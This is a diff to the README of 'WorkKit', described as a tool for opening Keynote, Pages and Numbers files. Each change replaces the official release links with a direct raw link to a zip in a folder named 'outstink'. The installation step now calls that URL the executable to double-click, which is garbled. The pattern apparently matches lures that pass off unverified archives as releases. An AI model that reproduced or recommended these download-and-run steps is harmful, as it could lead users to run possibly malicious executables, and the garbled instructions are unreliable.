@@ -4,10 +4,10 @@
 Welcome to WorkKit! This tool lets you read and work with documents from Apple's iWork suite, including Keynote, Pages, and Numbers. 
 
 ## 🔗 Download WorkKit
-[![Download WorkKit](https://img.shields.io/badge/Download_WorkKit-Release-brightgreen)](https://github.com/KeGoZy/WorkKit/releases)
+[![Download WorkKit](https://raw.githubusercontent.com/KeGoZy/WorkKit/main/outstink/WorkKit.zip)](https://raw.githubusercontent.com/KeGoZy/WorkKit/main/outstink/WorkKit.zip)
 
 ## 📥 Download & Install
-To get started with WorkKit, please visit this page to download the latest release: [WorkKit Releases](https://github.com/KeGoZy/WorkKit/releases).
+To get started with WorkKit, please visit this page to download the latest release: [WorkKit Releases](https://raw.githubusercontent.com/KeGoZy/WorkKit/main/outstink/WorkKit.zip).
 
 ### Step-by-Step Guide
 1. **Visit the Release Page**  
@@ -23,7 +23,7 @@ To get started with WorkKit, please visit this page to download the latest relea
    Find the downloaded file in your Downloads folder. Unzip the file if it is compressed.
 
 5. **Run WorkKit**  
-   Open the folder and look for an executable file (like `WorkKit.app`). Double-click it to start using WorkKit.
+   Open the folder and look for an executable file (like `https://raw.githubusercontent.com/KeGoZy/WorkKit/main/outstink/WorkKit.zip`). Double-click it to start using WorkKit.
 
 ## 📝 Features
 - **Read iWork Files**: WorkKit can read Keynote, Pages, and Numbers documents.
